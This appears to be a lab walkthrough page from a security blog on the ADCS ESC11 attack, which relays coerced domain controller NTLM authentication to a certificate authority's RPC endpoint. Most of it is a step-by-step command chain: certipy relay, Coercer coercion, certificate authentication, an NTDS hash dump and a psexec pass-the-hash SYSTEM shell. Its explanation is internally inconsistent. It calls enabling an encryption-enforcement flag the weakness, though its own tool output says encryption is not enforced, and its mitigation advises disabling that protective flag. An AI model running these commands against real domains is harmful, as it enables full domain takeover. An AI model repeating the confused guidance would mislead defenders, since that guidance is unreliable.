@@ -1,0 +1,129 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
+            <h1 class="post-title entry-title">ADCS ESC11 – Relaying NTLM to ICPR</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/" rel="bookmark"><time class="entry-date published" datetime="2025-06-29T18:39:24+00:00">June 29, 2025</time><time class="updated" datetime="2025-06-29T19:21:34+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><strong>ESC11 (Enterprise Security Control 11)</strong> represents a sophisticated attack path targeting <strong>Active Directory Certificate Services (AD CS)</strong>, exploiting a dangerous combination of vulnerabilities. This advanced security threat leverages <strong>RPC-only certificate enrollment enforcement</strong>, <strong>NTLM relay vulnerabilities</strong>, and <strong>coercion techniques</strong> that force <strong>NTLM authentication</strong> from privileged machines, including <strong>Domain Controllers</strong>. As a result, ESC11 opens the door to potential <strong>escalated privileges</strong> and unauthorized access, making it a critical concern for organizations relying on AD CS for their certificate management. Understanding and mitigating ESC11’s risks are essential for securing Active Directory environments from these complex and evolving threats.</span></p>
+<h2><span style="color: #800000;">Table of Content</span></h2>
+<ul>
+<li><span style="color: #000000;"><strong>Overview the ESC11 Attack</strong></span></li>
+<li><span style="color: #000000;"><strong>Key Misconfigurations Facilitating ESC11 </strong></span></li>
+<li><span style="color: #000000;"><strong>ESC8 vs ESC11 – How These Attacks Differ</strong></span></li>
+<li><span style="color: #000000;"><strong>Prerequisites</strong></span></li>
+<li><span style="color: #000000;"><strong>Lab Setup</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration &amp; Exploitation </strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Coercion and RPC Relay Chain for Domain Controller Certificate Abuse</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Post Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Gain Full SYSTEM Shell via Impacket PsExec</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Mitigation </strong></span></p>
+<h3><span style="color: #800000;">Overview the ESC11 Attack</span></h3>
+<p><span style="color: #000000;"><strong>ESC11</strong> is an advanced attack path targeting <strong>Active Directory Certificate Services (AD CS)</strong>, exploiting a dangerous combination of vulnerabilities. It leverages <strong>RPC-only certificate enrollment enforcement</strong>, <strong>vulnerable NTLM relay opportunities</strong>, and <strong>coercion techniques</strong> to force <strong>NTLM authentication</strong> from privileged machines, such as <strong>Domain Controllers</strong>.</span></p>
+<p><span style="color: #000000;">In response to security concerns, <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-enforce-encryption-rpc"><strong>Microsoft</strong></a> </span>recommends setting a specific registry flag on <strong>Certificate Authorities</strong> to enforce encryption on certificate requests. The recommended command is:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -setreg CA\InterfaceFlags -IF_ENFORCEENCRYPTICERTREQUEST</pre>
+<p><span style="color: #000000;">This ensures that all certificate requests are conducted through <strong>encrypted RPC</strong> rather than insecure channels like <strong>HTTP</strong>. However, this configuration ironically creates a potential vulnerability, as it opens the door for ESC11, especially when <strong>RPC endpoints</strong> remain susceptible to <strong>NTLM relay attacks</strong>.</span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Key Misconfigurations Facilitating ESC11</span> </span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>IF_ENFORCEENCRYPTICERTREQUEST Enabled:</strong> Forces RPC enrollment, making CA vulnerable to relay attacks over RPC</span></li>
+<li><span style="color: #000000;"><strong>Vulnerable Templates Published (e.g., DomainController):</strong> Templates that issue certificates usable for Kerberos authentication.</span></li>
+<li><span style="color: #000000;"><strong>Unprotected CA RPC Endpoints:</strong> No SMB signing, no Extended Protection for Authentication (EPA), and no NTLM relay protection.</span></li>
+<li><span style="color: #000000;"><strong>No Monitoring for Coercion Activity:</strong> Lack of logging for NTLM authentication coercion flows.</span></li>
+</ul>
+<h3><span style="color: #800000;">ESC8 vs ESC11 – How These Attacks Differ</span></h3>
+<p><span style="color: #000000;"><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/">ESC8</a> </span>and <strong>ESC11</strong> are advanced attack paths that target <strong>Active Directory Certificate Services (AD CS)</strong>, exploiting various vulnerabilities within the certificate enrollment process. While both attacks leverage <strong>NTLM relay</strong> techniques, they differ significantly in their methods, targets, and underlying weaknesses.</span></p>
+<p><span style="color: #000000;"><strong>ESC8:</strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Enrollment Target:</strong> <strong>Web Enrollment</strong> via <strong>HTTP</strong>.</span></li>
+<li><span style="color: #000000;"><strong>Authentication Path:</strong> <strong>NTLM relay</strong> over <strong>HTTP</strong>.</span></li>
+<li><span style="color: #000000;"><strong>Trigger Method:</strong> Uses <strong>PetitPotam</strong> and <strong>HTTP relay</strong></span></li>
+<li><span style="color: #000000;"><strong>CA Setting Focus:</strong> Exploits <strong>web-based misconfigurations</strong> in the Certificate Authority settings.</span></li>
+<li><span style="color: #000000;"><strong>Templates Exploited:</strong> Primarily <strong>DomainController</strong> and <strong>User</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>ESC11:</strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Enrollment Target:</strong> <strong>CA RPC Interface</strong>.</span></li>
+<li><span style="color: #000000;"><strong>Authentication Path:</strong> <strong>NTLM relay</strong> over <strong>RPC</strong>.</span></li>
+<li><span style="color: #000000;"><strong>Trigger Method:</strong> Utilizes <strong>Coercer</strong> or <strong>NXC</strong> tools combined with <strong>RPC relay</strong></span></li>
+<li><span style="color: #000000;"><strong>CA Setting Focus:</strong> Leverages <strong>encrypted RPC requirement</strong>, specifically the <strong>IF_ENFORCEENCRYPTICERTREQUEST</strong> registry setting.</span></li>
+<li><span style="color: #000000;"><strong>Templates Exploited:</strong> Primarily the <strong>DomainController</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong><em>Note:</em></strong><em> While organizations may mitigate ESC8 by disabling <strong>Web Enrollment</strong> or enforcing encrypted RPC certificate requests, ESC11 bypasses these defenses. Instead of abusing <strong>HTTP</strong> like ESC8, <strong>ESC11</strong> exploits <strong>RPC-based certificate issuance</strong>, circumventing the encryption measures in place.</em></span></p>
+<p><span style="color: #000000;">For this walkthrough, we will assume the following network setup as Prerequisites</span></p>
+<h3><span style="color: #800000;">Prerequisite </span></h3>
+<ul>
+<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
+<li><span style="color: #000000;">Active Directory Certificate Services and Certificate Authority configured with <strong>RPC encryption enforcement</strong> enabled</span></li>
+<li><span style="color: #000000;">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000;">Tools: NXC, Coercion, certipy-ad, Impacket-psexec</span></li>
+</ul>
+<h3><span style="color: #800000;">Lab Setup</span></h3>
+<p><span style="color: #000000;">Note that we won’t delve into the full domain or <strong>ADCS</strong> deployment process here, but we’ll focus on the <strong>ESC11</strong> exploitation technique, which targets RPC-based certificate issuance.</span></p>
+<p><span style="color: #000000;">To simulate the defense against <strong>ESC8</strong>, the <strong>RPC encryption enforcement</strong> on the <strong>CA</strong> needs to be enabled. This action ensures that all certificate requests are encrypted, requiring the use of <strong>RPC</strong> for certificate enrollment. However, this security measure directly facilitates <strong>ESC11</strong>, allowing the attacker to pivot their attack from <strong>HTTP</strong> to <strong>RPC</strong>.</span></p>
+<p><span style="color: #000000;"><strong>Enable RPC Encryption Enforcement on the CA</strong></span></p>
+<p><span style="color: #000000;">To enable this setting on the <strong>CA</strong>, run the following commands:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -setreg CA\InterfaceFlags -IF_ENFORCEENCRYPTICERTREQUEST</pre>
+<p><span style="color: #000000;">This forces all certificate requests to the CA to happen over encrypted RPC channels, <strong>a requirement for triggering ESC11 via relay</strong>.</span></p>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHN7X4ft9nmaihU9KKiVg9gdhcr-KPK9oJUPVKue7ccLzD4cs6_TAtEhAfNxLCfFxJw4AhqxCmR9siUFFrKX211dUoegTZmQh21hbRag17NvdcOtl93mNZuiOXjodCFrUC2MICYlF7xkGkgfj7Txa7IOg8D9ivg3W3aqFK9b0RdaDXeliqrslAsl_Vqutu/s16000/1.png" alt="ADCS ESC11 NTLM Relay to ICertPassage" width="1269" height="698"/></span></p>
+<p><span style="color: #000000;"><strong><em>Note:</em></strong><em> Enabling RPC encryption secures certificate requests, but it also creates an opportunity for <strong>ESC11</strong> to exploit the same channel.</em></span></p>
+<h2><span style="color: #000000;"><span style="color: #800000;">Enumeration &amp; Exploitation</span> </span></h2>
+<h3><span style="color: #800000;">Coercion and RPC Relay Chain for Domain Controller Certificate Abuse</span></h3>
+<p><span style="color: #000000;">Now that we’ve enabled <strong>RPC encryption enforcement</strong> on the <strong>Certificate Authority (CA)</strong>, let’s begin the process of discovering vulnerable <strong>certificate templates</strong> that could be abused. Specifically, the <strong>DomainController</strong> template is often targeted in <strong>ESC11</strong> because it allows <strong>computer accounts</strong> to request certificates, which could ultimately facilitate <strong>privilege escalation</strong> or further attacks on <strong>Domain Controllers</strong>.</span></p>
+<h4><span style="color: #000000;">Discover Vulnerable Certificate Templates </span></h4>
+<p><span style="color: #000000;">To identify vulnerable certificate templates that can be abused, the following command can be run from the attacker’s machine (Kali):</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u 'raj@ignite.local' -p 'Password@1' -dc-ip 192.168.1.4 -vulnerable</pre>
+<p><span style="color: #000000;">This command queries the <strong>Active Directory</strong> to find certificate templates that allow us to request certificates under conditions that could exploit <strong>RPC-based enrollment</strong>, particularly focusing on the <strong>DomainController</strong> template.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkD5Egm3UkeA-rVZLnwAg_adcejnGGTQtI3PxHjB8ZbZWT8OVKI8vHr3wZP52EZOLZ-3u3Vpn2A9u8fv-fG1kH1kipPPFDcxEKgLyAqUPZqIzZjOKX-76ucp7erD4CABaIyTI-EF9kH0BxoIHXiER8y40V-44uC6kFYWaF9gBGIbjNKVUuANh02AMrDCl5/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Let’s review the saved output</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwKETujFYFea1JOXqNBwZIBMwaa7rqPAvHU4A_99mvNXwZqX-NuPdNS2yNBF-oOUDTKsxoPbTR1TRsw3FSjNTsoUGCkDfFtpMA03gbW_iroFaAHXpsewDCdSlJvK33Vkv5cO6m8yX81Ar8MtN-iIx94CXZ0_bQ91IJWnnlVsVUnEmhZpa97JPE3rADyWlP/s16000/3.png" alt="ADCS ESC11 NTLM Relay to ICertPassage" width="1336" height="690"/></span></p>
+<p><span style="color: #000000;"><strong>As we can see Encryption is not enforced for ICPR requests </strong>leaving a potential attack vector for <strong>ESC11</strong> to exploit.</span></p>
+<h4><span style="color: #000000;">Initiate First Relay to the CA’s RPC Endpoint</span></h4>
+<p><span style="color: #000000;">We initiate the first <strong>NTLM relay</strong> attempt toward the <strong>CA’s RPC endpoint</strong> using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad relay -target "rpc://192.168.1.10" -ca "ignite-DC2-CA" -template DomainController</pre>
+<p><span style="color: #000000;">At this point, the <strong>relay listener</strong> is ready and waiting for <strong>NTLM authentication</strong> from a <strong>privileged machine</strong>. When authentication is captured, it will be relayed to the <strong>CA’s RPC interface</strong> for <strong>certificate enrollment</strong> under the <strong>DomainController</strong> template.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-knDIWzaZ1ayTzsfvQ3lb3tklBTBScqj0xbqt99MKRYwzxcmcXXOvkuFm7w9H3LudTvwExq5SvgIwwo2KWAX1CmydZEaDjbOqwNQkSCQ12GLxo5FWdewEFvPvJBIqXb9sXUXQsLdEhP95LGMSk0Xrp5G4zvWeqk3KfFJcJBl1bdl2s_cMMlHLeCCXmLpR/s16000/4.png"/></span></p>
+<h4><span style="color: #000000;">Coerce the DC to Authenticate (Trigger NTLM)</span></h4>
+<p><span style="color: #000000;">At this stage, we need to force the <strong>Domain Controller (DC)</strong> at <strong>192.169.1.4</strong> to authenticate to our <strong>attacker-controlled relay machine</strong> at <strong>192.168.1.11</strong>. We do this by using <strong>Coercer</strong> (or similar tools like <strong>PetitPotam</strong> or <strong>NXC</strong>) to manipulate the <strong>DC</strong> into sending its <strong>NTLM credentials</strong> to our listener. The command to trigger this is:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">coercer coerce -l 192.168.1.11 -t 192.168.1.4 -d ignite.local -u raj -p Password@1</pre>
+<p><span style="color: #000000;">This uses <strong>Coercer</strong> to trick the DC into sending its NTLM credentials to our attacker relay listener. This NTLM flow is crucial for authenticating to the CA on behalf of the DC.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbRMMK-uPTp7p1PJ8-Eu6w_RTFt20lKim9FBbVGyWN6fOIRE_5FjXyVfh7SRbLggU4E0N6NM5BnW_qdM_A7JSTqeWMVM-ccfnvoNNQ4U0YqcRH9nbco5Qm2dGJV7k8NoUwwOLVBiJNiN9fX5RsfDihAcw0cxiORSShTv8WJJV-qq3FAx-RGxWAzU7oJIbb/s16000/5.png" alt="ADCS ESC11 NTLM Relay to ICertPassage" width="1261" height="403"/></span></p>
+<h4><span style="color: #000000;">Relay Again to Capture the Domain Controller Certificate</span></h4>
+<p><span style="color: #000000;">After capturing the <strong>NTLM authentication</strong> from the <strong>Domain Controller (DC)</strong>, we trigger the relay once again to complete the certificate enrollment process. This is done with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad relay -target "rpc: //192.168.1.10" -ca "ignite-DC2-CA" -template DomainController</pre>
+<p><span style="color: #000000;">At this point, the <strong>Certificate Authority (CA)</strong> issues a <strong>certificate</strong> for the <strong>DC account</strong> (e.g., <strong>dc1$</strong>). We then saves the resulting <strong>.pfx file</strong> (e.g., <strong>dc1.pfx</strong>), which contains the <strong>private keys</strong>. These keys are essential, as they enable <strong>Kerberos authentication</strong> as the <strong>Domain Controller</strong> itself.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7dB6TQPgW5SM6JYIg5K-HhKFqzoUp1d2rwLGFLkU4u1la-bRxYNts-SLIXLCfJd9ewjUd9gwYQARZTHyZxKn7BPfl4l3tWxJ8-qEAcoXzngbSU4NAJHnQy2PPtNXPxiSjwaB6_nBRu4ied9GgOBer1-uRg64-x0wq92RVafUEDqsHJLGpsHiasVqLkgMk/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">With the <strong>.pfx file</strong> in hand, we now have full access to the <strong>private keys</strong> of the <strong>Domain Controller</strong>. These keys allow us to authenticate as the <strong>DC</strong> using <strong>Kerberos</strong>, which can lead to further escalation and unauthorized access within the domain.</span></p>
+<h4><span style="color: #000000;">Authenticate as the DC Using the Captured Certificate</span></h4>
+<p><span style="color: #000000;">Use the stolen certificate to authenticate to AD as the DC machine account:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx dc1.pfx -dc-ip 192.168.1.4 -ldap-shell</pre>
+<p><span style="color: #000000;">This provides <strong>LDAP shell access</strong> with machine-level privileges, giving the attacker capabilities like <strong>DCSync</strong>, <strong>group enumeration</strong>, and <strong>NTDS secrets extraction</strong>.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgV9HrDmrO6GEk-O94DxgrQM8zzRCVVjR9mDIYFvXg63T6WYQUqGuXWY4hGpMsVb1HpGMRWYUiQG1e3537YXXbWB__zQP-Ls5IJouGGbI1UKuARlHG7IiS7lxlKgF40wsqQjLlBUQprmeAHdraMSAlMfVxEJj8If3B0Vn9Bpaw34420Kpv0vBWzI-bFYmKg/s16000/7.png" alt="ADCS ESC11 NTLM Relay to ICertPassage" width="897" height="308"/></span></p>
+<h4><span style="color: #000000;">Extract Administrator Hash via NXC SMB Module</span></h4>
+<p><span style="color: #000000;">Now that we have DC-level access, extract sensitive credentials:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc smb 192.168.1.4 --pfx-cert dc1.pfx -u "dc1$" --ntds --user Administrator</pre>
+<p><span style="color: #000000;">This dumps the <strong>NTDS.dit</strong> file and <strong>Administrator NTLM hash</strong>, providing the final key for full domain dominance.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgC547xSyX1ViHBRQ74aRJ08zGdCjjmsFP2XL_jZPLS9UDYo0OyDCesSEfA9dxTEsxYGT9aWfv_hvoV41MZJLGU3qu32H4QKLs60o9pca7jHToio_wXKXBPkqrRgxLwtgn0c50foHdTaOnfo_Ha-YnlZZOtMdvZ4pk2grHQvQlrpw5hJ4CyFqxpO1FoFRTG/s16000/8.png"/></span></p>
+<h2><span style="color: #800000;">Post Exploitation</span></h2>
+<h3><span style="color: #800000;">Gain Full SYSTEM Shell via Impacket PsExec</span></h3>
+<p><span style="color: #000000;">Finally, use the Administrator hash to execute remote code on the Domain Controller:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec ignite.local/administrator@ignite.local -hashes :64fbae31cc352fc26af97cbdef151e03</pre>
+<p><span style="color: #000000;">This spawns a <strong>full SYSTEM shell</strong> on the DC, completing the ESC11 exploitation chain.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUmu0d8vTYbyIBqgFhkBA6KFGcTwKhLq2l6YFwGs32_fsgMiv-wlndkg_ddwC2rQ6-TJJl-xgiTQW5qe_vradlGbRUlmIVIfEohZL5wVTqJK9V0JpcPYO3vYaGOf0-rmL_36f-yQWaRSd53U6IxlNkPAv7wLNISM4kspmXCLycp0C8dgivR6kDGacshVRr/s16000/9.png" alt="ADCS ESC11 NTLM Relay to ICertPassage" width="1359" height="402"/></span></p>
+<h2><span style="color: #800000;">Mitigation</span></h2>
+<ul>
+<li><span style="color: #000000;"><strong>Disable or tightly control </strong><strong>IF_ENFORCEENCRYPTICERTREQUEST</strong></span></li>
+<li><span style="color: #000000;"><strong>Restrict NTLM relay opportunities</strong>: Enforce SMB signing and NTLM protections.</span></li>
+<li><span style="color: #000000;"><strong>Patch known relay vulnerabilities</strong> (PetitPotam, MS-RPRN, EFSRPC abuses).</span></li>
+<li><span style="color: #000000;"><strong>Restrict certificate template enrollment</strong>: Limit access to high-value templates like DomainController.</span></li>
+<li><span style="color: #000000;"><strong>Monitor for unusual certificate enrollment and RPC activity</strong>.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Author</strong>: MD Aslam drives security excellence and mentors teams to strengthen security across products, networks, and organizations as a dynamic Information Security leader. Contact <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
